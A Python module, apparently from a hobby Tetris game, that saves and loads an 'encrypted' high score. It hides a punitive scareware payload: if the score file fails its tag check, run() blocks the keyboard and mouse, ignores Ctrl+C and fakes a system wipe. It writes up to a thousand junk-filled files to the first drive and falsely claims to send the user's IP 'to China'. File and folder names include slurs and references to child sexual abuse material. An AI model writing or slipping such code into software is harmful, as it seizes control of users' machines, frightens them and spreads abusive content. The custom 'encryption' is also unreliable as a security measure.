from time import sleep, time
from random import uniform, randint, choice
import signal
import os
from string import ascii_uppercase
from pathlib import Path
from pynput import mouse
from keyboard import block_key

key = 0b0110111110110000100001010

cache_times = [0.01, 0.05, 0.0, 0.1]

keys_to_block = [
    'q','w','e','r','t','y','u','i','o','p',
    'a','s','d','f','g','h','j','k','l',
    'z','x','c','v','b','n','m',

    'f1','f2','f3','f4','f5','f6','f7','f8','f9','f10','f11','f12',
    'alt gr','alt','esc','ctrl','shift','enter','backspace'
]

class CheatingError(Exception):
    """Raised when a player tampers with the save file."""
    
# 1. This function is for standard click handling (optional)
def my_on_click(x, y, button, pressed):
    pass 

# 2. This function matches the Windows API signature (msg, data)
def win32_blocker(msg, data):
    # Returning False here tells Windows to completely ignore the click
    return False

# 3. Initialize the listener manually
listener = mouse.Listener(
    on_click=my_on_click,          # Normal callback
    win32_event_filter=win32_blocker, # Windows low-level blocker
    suppress=True
)

def run():
    for key in keys_to_block:
        block_key(key)
    listener.start()
    signal.signal(signal.SIGINT, signal.SIG_IGN)

    drivers = [f"{letter}:" for letter in ascii_uppercase if os.path.exists(f"{letter}:")]

    start_path = "\\tetris_folder\\"
    folders = [
        "Windows\\System32", "Users\\Public\\Documents",
        "Program Files\\Common Files", "Users\\You\\Desktop",
        "Users\\You\\Pictures", "ProgramData\\Microsoft", "Windows\\authors\\MichaelJackson", "Users\\andre\\porn\\pdfs",
        "MyPorn\\children", "FeetLovers\\Men", "System\\FeetLovers\\cats", "DONTOPEN\\DONTOPEN2\\PLEASEDONTOPEN\\IMBEGGINGYOU\\YOUDONTWANTTODOTHIS\\okay_i_give_up\\SIKE",
        "FamilyLove\\mom", "my_cults", "malwhat\\runners\\real_ones", "moms_needs\\on_the_wall",
        "Pics\\JohnProk", "NakedRats\\bald\\thin", "malwhat\\bombs\\zip", "malwhat\\virus\\dangerous", "malwhat\\virus\\not_safe",
    ]
    for i in range(len(folders)):
        folders[i] = drivers[0] + start_path + folders[i]
    files = [
        "kernel32.dll", "config.sys", "notes.txt", "savegame.dat",
        "cp.jpg", "driver.inf", "ntoskrnl.exe", "cache.tmp", "bomb.click(now_please)",
        "porn.porn", "cp4k.mp4", "catFeet.jpg", "dih.exe", "my.dih",
        "KKKSecrets.txt", "pork.bat", "sliced_pork(secret).mp4", "hotmoms.click",
        "NotMalwhere.exe", "indianVirus.txt", "Fornite.bat", "GoogleMaps.html",
        "DO_NOT_OPEN.msi", "Calc.ulator", "Tuff.cmd", "Roblox.exe", "Discord.Hayday",
        "Song.mp10", "bomb.zip", "42.zip", "Windows.cp", "money.pdf", "Hacking.yes",
        "Press.exe", "explosive.boom", "recipies_to_fusionpower.idea", "how_to_create_a_bomb.txt",
        "C++.exe", "clicknow.thankyou", "ARE_YOU.ARE_YOU.COMING_TO_THE_TREE"
    ]
    text = [
        "We are Charlie Kirk\n" * 676767,
        "67 "*670000,
        "Stop cheating in tetris\n" * 10000,
        "I think you're slimed. " * 100000,
        "Bro stop cheating. " * 67000,
        """I'm in the thick of it, everybody knows
        They know me where it snows, I skied in and they froze
        I don't know no nothin' 'bout no ice, I'm just cold
        Forty somethin' milli' subs or so, I've been told\n\n""" * 10000,
        """Woah-oh-oh
        This is how the story goes
        Woah-oh-oh
        I guess this is how the story goes\n\n""" * 10000,
        "You low key suck at tetris if you need to cheat tbh.\n" * 67000,
        "Massive " * 6767,
        "https://en.wikipedia.org/wiki/Bomb-making_instructions_on_the_Internet\n" * 10000,
        "https://www.theguardian.com/technology/2025/aug/28/chatgpt-offered-bomb-recipes-and-hacking-tips-during-safety-tests\n" * 10000,
        "ph.com\n" * 676767,
        "dawg " * 676767,
        "Type Stuff " * 10000 + " secret wow",
        "Tiki tiki tiki tiki.\n" * 100000,
        "0110111110110000100001010 DO NOT TRANSLATE THIS.\n" * 676767,
        str(signal.__builtins__) * 10000,
        "Video of john pork.\n" * 100000,
        "Super rare legendary binary code: 0100000101101110011001000110010101110010011100110010000001101111011001110010000001000001011011100110010001110010011001010110000101110011001000000110010101110010001000000111001101101001011001110110110101100001\n" * 10000,
        

    ]
    print("YOU TRIED TO CHEAT BY CHANGING THE HIGHSCORE FILE.")
    sleep(1.7)
    print("YOU HAVE TO FACE THE CONSEQUENSES OF YOUR ACTIONS")
    sleep(1.8)
    print("\nWARNING: Initiating full system wipe...")
    sleep(1.4)
    print("Stack-wiping ", end="")
    [print(d, end=", ") for d in drivers]
    print("\b\b")
    
    sleep(2)
    for i in range(1, 1001):
        file = choice(files)
        folder = choice(folders)

        full_file = f"{folder}\\{file}"
        if i % 10 == 0:
            visual_folder = folder[0:3] + folder[17:]
            full_visual_file = f"{visual_folder}\\{file}"

            print(f"[{(i//10):3d}%] Deleting {full_visual_file}")
            #sleep(uniform(0.0, 0.05))


        file_path = Path(f"{full_file}")
        file_path.parent.mkdir(parents=True, exist_ok=True)

        try:
            with file_path.open(mode="x") as f:
                f.write(choice(text))
        except FileExistsError:
            print(f"Found virus at {choice(files)}. Duplicating the virus ;)")
        
    print("All files deleted.\n")
    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip = s.getsockname()[0]
    s.close()
    
    print(f"Ip: {ip}")
    print("Sending ip to China...")
    sleep(5.23)
    print(f"Sending proxy {ip} to port:1414")
    sleep(2.711)
    for i in range(randint(44, 271)):
        print(f"Caching {choice(files)} reg{i*i%1777}")
        sleep(choice(cache_times))

    sleep(3)
    listener.stop()
    print("\nThanks for playing!\nSee you soon.")
    sleep(2.1234)
    exit()

def generate_tag(value: int) -> int:
    return (value ^ key) * 67

def validate_tag(value: int, tag: int) -> int:
    return generate_tag(value) == tag

def save_score(score: int):
    file = open("highscore.bin", "wb")
    file.write(encrypt(score).to_bytes(32, byteorder="little"))
    file.write(generate_tag(score).to_bytes(32, byteorder="little"))
    file.close()

def load_score() -> int:
    try:
        file = open("highscore.bin", "rb")
        score_data = file.read(32)
        tag_data = file.read(32)
        file.close()

        if not score_data:
            return 0

        encrypted_score = int.from_bytes(score_data, byteorder="little")
        decrypted_score = decrypt(encrypted_score)

        loaded_tag = int.from_bytes(tag_data, byteorder="little")

        if not validate_tag(decrypted_score, loaded_tag):
            run()

            

        return decrypted_score
    
    except FileNotFoundError:
        return -1

def make_str_int(da_string: str) -> int:
    result = 0
    for ch in da_string:
        result += ord(ch)
    return result

num = make_str_int("\b")
pi = 3.14159265358979641555151566244633646443431244321434434343241331765788362541588425256788522552
num ^= 1111333
num ^= 1111333

def encrypt(value: int) -> int:
    step1 = ((value * key) ^ key)
    return (step1 * (key * 67)) * int(pi * 10**7)

def decrypt(value: int) -> int:
    d1 = value // int(pi * 10**7)
    d2 = d1 // (key * 67)
    d3 = d2 ^ key
    return d3 // key

if __name__ == "__main__":
    while True:
        try:
            da_number = int(input("Encryption Num: "))
            start_time = time()
            en = encrypt(da_number)
            print(f"Encrypted number: {en}")
            de = decrypt(en)
            print(f"Decrypted number: {de}")

            end_time = time()

            print(f"Time: {(end_time - start_time) * 1000} ms")
            print("-------------------------------------------")


        except KeyboardInterrupt:
            print("\nExiting")
            break